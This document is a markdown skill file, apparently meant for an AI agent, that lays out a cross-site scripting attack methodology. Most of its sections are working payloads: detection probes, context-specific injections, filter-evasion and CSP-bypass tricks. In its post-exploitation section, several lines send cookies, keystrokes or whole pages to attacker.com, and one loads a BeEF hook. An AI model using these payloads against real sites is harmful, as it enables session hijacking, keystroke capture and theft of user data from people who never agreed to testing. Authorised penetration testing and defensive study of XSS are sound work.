---
name: xss
description: Cross-Site Scripting expert methodology covering reflected, stored, DOM-based, and mutation XSS. Includes CSP bypass, filter evasion, and post-exploitation (session hijacking, keyloggers, BeEF integration).
version: 1.0.0
license: Apache-2.0
---

# Cross-Site Scripting (XSS)

## Attack Surface

Reflected: URL parameters, search fields, error messages, redirect parameters.
Stored: comments, profiles, names, addresses, any user-controlled content persisted and rendered to others.
DOM-based: JavaScript that reads from location.hash, document.referrer, location.search, postMessage without sanitisation.

## Methodology

### Phase 1 — Detection

```html
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
{{7*7}}                    -- template injection test alongside XSS
```

Track where your test string appears in the response. Identify the context:
- HTML body (tag injection)
- HTML attribute (attribute injection)
- JavaScript string (JS injection)
- JavaScript in `href`/`src` (URL context)

### Phase 2 — Context-specific payloads

**HTML body:**
```html
<script>alert(document.cookie)</script>
<img src=x onerror=fetch('//attacker.com/?c='+document.cookie)>
<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
```

**HTML attribute:**
```html
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
"><img src=x onerror=alert(1)>
```

**JavaScript string context:**
```javascript
'-alert(1)-'
\'-alert(1)//
`;alert(1)//
```

**href/src URL context:**
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

**DOM-based (source: location.hash):**
```
http://target/#"><img src=x onerror=alert(1)>
http://target/#javascript:alert(1)
```

### Phase 3 — Filter bypass

```html
<!-- Keyword filter bypass -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<SCRIPT>alert(1)</SCRIPT>     <!-- case -->
<script/src=//attacker.com/x.js>

<!-- Event handler alternatives -->
<body onload=alert(1)>
<iframe onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

<!-- Encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=alert(1)>
```

### Phase 4 — CSP bypass

```javascript
// Check CSP header
Content-Security-Policy: script-src 'self' cdn.example.com

// Bypass via allowed CDN with uploadable content (Angular, jQuery)
<script src="https://cdn.example.com/angular.js"></script>
<div ng-app ng-csp><div ng-include="'http://attacker.com/payload.js'"></div>

// JSONP bypass (if jsonp endpoint on allowed domain)
<script src="https://api.example.com/callback?callback=alert(1)"></script>

// 'unsafe-inline' with nonce: brute force or leak nonce value
// 'strict-dynamic': find script gadget in allowed scripts
```

### Phase 5 — Post-exploitation

**Cookie/session hijacking:**
```javascript
fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie))
```

**Keylogger:**
```javascript
document.addEventListener('keypress', e =>
  fetch('https://attacker.com/keys?k='+e.key))
```

**Full page exfiltration:**
```javascript
fetch('https://attacker.com/page', {
  method: 'POST',
  body: document.documentElement.innerHTML
})
```

**BeEF hook:**
```html
<script src="http://attacker.com:3000/hook.js"></script>
```

## Tools

- Burp Suite Pro — scanner + repeater
- [XSStrike](https://github.com/s0md3v/XSStrike) — advanced XSS detection
- [dalfox](https://github.com/hahwul/dalfox) — fast XSS scanner
- [BeEF](https://beefproject.com) — browser exploitation framework
- [XSS Hunter](https://xsshunter.com) — blind XSS detection

## OWASP Top 10 Mapping

- A03:2021 — Injection (XSS)
